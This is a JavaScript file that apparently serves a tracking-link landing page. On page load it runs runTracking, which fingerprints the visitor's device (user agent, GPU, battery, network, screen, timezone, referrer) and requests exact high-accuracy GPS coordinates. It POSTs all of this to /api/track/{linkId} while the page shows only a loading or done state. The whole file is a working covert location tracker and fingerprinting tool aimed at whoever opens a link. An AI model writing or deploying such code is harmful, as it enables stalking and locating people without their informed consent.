function parseUserAgent(ua) {
  const info = {
    deviceType: 'Unknown',
    os: 'Unknown',
    browser: 'Unknown',
    model: '',
  };

  if (/Mobile|Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
    info.deviceType = /iPad|Tablet/i.test(ua) ? 'Tablet' : 'Mobile';
  } else {
    info.deviceType = 'Desktop';
  }

  if (/iPhone/i.test(ua)) {
    info.os = 'iOS';
    const match = ua.match(/iPhone OS (\d+[._]\d+)/);
    if (match) info.os += ` ${match[1].replace('_', '.')}`;
    info.model = 'iPhone';
  } else if (/iPad/i.test(ua)) {
    info.os = 'iPadOS';
    info.model = 'iPad';
  } else if (/Android/i.test(ua)) {
    info.os = 'Android';
    const androidMatch = ua.match(/Android (\d+\.?\d*)/);
    if (androidMatch) info.os += ` ${androidMatch[1]}`;
    const modelMatch = ua.match(/;\s*([^;)]+)\s*Build\//);
    if (modelMatch) info.model = modelMatch[1].trim();
  } else if (/Windows/i.test(ua)) {
    info.os = 'Windows';
    const winMatch = ua.match(/Windows NT (\d+\.\d+)/);
    if (winMatch) {
      const ver = winMatch[1];
      if (ver === '10.0') info.os = 'Windows 10/11';
      else if (ver === '6.3') info.os = 'Windows 8.1';
      else if (ver === '6.2') info.os = 'Windows 8';
      else if (ver === '6.1') info.os = 'Windows 7';
    }
  } else if (/Mac OS X/i.test(ua)) {
    info.os = 'macOS';
    const macMatch = ua.match(/Mac OS X (\d+[._]\d+)/);
    if (macMatch) info.os += ` ${macMatch[1].replace('_', '.')}`;
  } else if (/Linux/i.test(ua)) {
    info.os = 'Linux';
  }

  if (/Edg\//i.test(ua)) info.browser = 'Microsoft Edge';
  else if (/Chrome/i.test(ua) && !/Chromium/i.test(ua)) info.browser = 'Chrome';
  else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) info.browser = 'Safari';
  else if (/Firefox/i.test(ua)) info.browser = 'Firefox';
  else if (/Opera|OPR/i.test(ua)) info.browser = 'Opera';

  return info;
}

async function getBatteryInfo() {
  try {
    if ('getBattery' in navigator) {
      const battery = await navigator.getBattery();
      return {
        level: `${Math.round(battery.level * 100)}%`,
        charging: battery.charging,
      };
    }
  } catch { /* unsupported */ }
  return null;
}

async function getConnectionInfo() {
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!conn) return null;
  return {
    type: conn.effectiveType || conn.type || 'Unknown',
    downlink: conn.downlink ? `${conn.downlink} Mbps` : null,
    rtt: conn.rtt ? `${conn.rtt} ms` : null,
    saveData: conn.saveData || false
  };
}

async function getGpuInfo() {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        return {
          vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
          renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
        };
      }
    }
  } catch {}
  return null;
}

async function getExactGeolocation() {
  return new Promise((resolve) => {
    if (!('geolocation' in navigator)) {
      return resolve(null);
    }
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        resolve({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: `${Math.round(pos.coords.accuracy)} meters`,
          altitude: pos.coords.altitude ? `${Math.round(pos.coords.altitude)} m` : null,
          speed: pos.coords.speed ? `${pos.coords.speed} m/s` : null,
          mapsUrl: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
        });
      },
      () => {
        resolve(null); // denied or error
      },
      { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
    );
  });
}

async function collectDeviceInfo() {
  const ua = navigator.userAgent;
  const parsed = parseUserAgent(ua);
  const battery = await getBatteryInfo();
  const connection = await getConnectionInfo();
  const gpu = await getGpuInfo();
  const gpsLocation = await getExactGeolocation();

  const info = {
    userAgent: ua,
    deviceType: parsed.deviceType,
    os: parsed.os,
    browser: parsed.browser,
    model: parsed.model || null,
    platform: navigator.platform || null,
    language: navigator.language || null,
    languages: navigator.languages ? [...navigator.languages] : null,
    screenWidth: screen.width,
    screenHeight: screen.height,
    viewportWidth: window.innerWidth,
    viewportHeight: window.innerHeight,
    pixelRatio: window.devicePixelRatio || 1,
    colorDepth: screen.colorDepth,
    orientation: screen.orientation?.type || (window.innerWidth > window.innerHeight ? 'landscape' : 'portrait'),
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
    maxTouchPoints: navigator.maxTouchPoints || 0,
    cookiesEnabled: navigator.cookieEnabled,
    online: navigator.onLine,
    hardwareConcurrency: navigator.hardwareConcurrency || null,
    deviceMemory: navigator.deviceMemory || null,
    gpu: gpu ? `${gpu.renderer}` : null,
    referrer: document.referrer || null,
    battery,
    connection,
    gpsLocation
  };

  return info;
}

function getLinkId() {
  const parts = window.location.pathname.split('/');
  return parts[parts.length - 1];
}

async function runTracking() {
  const linkId = getLinkId();
  const loading = document.getElementById('loadingState');
  const done = document.getElementById('doneState');
  const error = document.getElementById('errorState');

  try {
    const deviceInfo = await collectDeviceInfo();

    const res = await fetch(`/api/track/${linkId}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(deviceInfo),
    });

    if (!res.ok) throw new Error('Track failed');

    loading.classList.add('hidden');
    done.classList.remove('hidden');
  } catch {
    loading.classList.add('hidden');
    error.classList.remove('hidden');
  }
}

runTracking();
